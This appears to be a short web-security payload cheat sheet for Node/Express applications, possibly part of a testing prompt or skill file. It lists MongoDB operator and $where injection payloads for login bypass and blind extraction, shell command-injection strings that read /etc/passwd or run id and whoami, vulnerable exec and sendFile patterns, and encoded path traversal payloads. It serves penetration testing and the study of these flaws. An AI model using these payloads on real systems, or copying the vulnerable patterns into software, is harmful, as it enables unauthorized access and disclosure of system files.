<injection_attacks>
<nosql_injection>
{% raw %}
# MongoDB injection (most common with Express)

# Operator injection:
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Query parameter injection:
?username[$ne]=&password[$ne]=
?username[$regex]=admin&password[$ne]=

# $where injection:
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/^a/)"}
{% endraw %}
</nosql_injection>

<command_injection>
{% raw %}
# Command injection via child_process

# If user input reaches exec/spawn:
; ls -la
| cat /etc/passwd
`id`
$(whoami)

# Common vulnerable patterns:
exec('convert ' + filename + ' output.png')
spawn('ffmpeg', ['-i', userInput])
{% endraw %}
</command_injection>

<path_traversal>
{% raw %}
# File serving vulnerabilities

# express.static with symlinks:
# Symlink following in static directory

# sendFile with user input:
res.sendFile(req.params.file)
# Attack: /../../../etc/passwd

# Path traversal payloads:
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
{% endraw %}
</path_traversal>
